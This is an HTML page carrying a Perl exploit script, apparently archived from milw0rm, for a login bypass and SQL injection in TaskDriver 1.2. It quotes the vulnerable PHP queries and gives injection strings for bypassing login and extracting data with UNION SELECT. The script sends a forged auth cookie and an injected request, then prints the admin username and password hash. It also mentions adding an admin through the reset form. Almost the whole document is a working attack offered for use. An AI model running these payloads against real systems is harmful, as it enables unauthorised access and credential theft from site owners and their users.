<html><head><title>TaskDriver <= 1.2 Login Bypass/SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#################################################################################
#										#
#	      TaskDriver &lt;= 1.2 Login Bypass/SQL Injection Exploit		#
#										#
# Discovered by: Silentz							#
# Payload: Login Bypass &amp; Admin Username &amp; Hash Retrieval			#
# Website: http://www.w4ck1ng.com						#
# 										#
# Vulnerable Code (login.php): 							#
#										#
# $sql = &quot;SELECT * FROM  $userstable WHERE username = '$_POST[username]' AND    #
#         password = md5('$_POST[password]')&quot;;					#
#										#
# Vulnerable Code (notes.php):							#
#       									#
# $taskid = $_GET['taskid'];							#
# $sql = &quot;SELECT * FROM $taskstable WHERE taskid = '$taskid'&quot;;			#
#										#
# PoC: http://victim.com/login.php						#
#      In username box input: ' OR 1=1 /*					#
#      In password box: [ANYTHING OR NOTHING]					#
#										#
#      OR: 									#
#										#
#      http://victim.com/notes.php?taskid=-999' UNION SELECT 0,0,username,      #
#      0,0,0,0,0,0,0,0,0,password FROM users WHERE userlevel='a' /*		#
# 										#
# Subject To: magic_quotes_gpc set to off					#
# GoogleDork: Get your own!							#
# Notes: You can do a UNION INSERT in the password reset form to add an admin	#
#										#
# Shoutz: The entire w4ck1ng community						#
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV &lt; 1){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;           TaskDriver &lt;= 1.2 Login Bypass/SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;Usage: w4ck1ng_taskdriver.pl [PATH]\r\n\r\n&quot;;
print &quot;[PATH] = Path where TaskDriver is located\r\n\r\n&quot;;
print &quot;e.g. w4ck1ng_taskdriver.pl http://victim.com/taskdriver/\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
exit();
}

$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$cookie = &quot;fook%21%27+or+1%3D1+%2F%2A;&quot;;
$host = $ARGV[0] . &quot;notes.php?taskid=-999' UNION SELECT 0,0,username,0,0,0,0,0,0,0,0,0,password FROM users WHERE userlevel='a' /*&quot;;

my @cookie = ('Cookie' =&gt; &quot;auth=$cookie;&quot;);
my $res = $b-&gt;get($host, @cookie);

$answer = $res-&gt;content;
if ($answer =~ /notes on (.*?)&lt;\/u&gt;&lt;\/td&gt;&lt;\/tr&gt;/){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            TaskDriver &lt;= 1.2 Login Bypass/SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;[+] Admin User : $1\n&quot;;
}

if ($answer =~/([0-9a-fA-F]{32})&lt;\/font&gt;/){
print &quot;[+] Admin Hash : $1\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
}

# milw0rm.com [2007-05-10]</pre></html>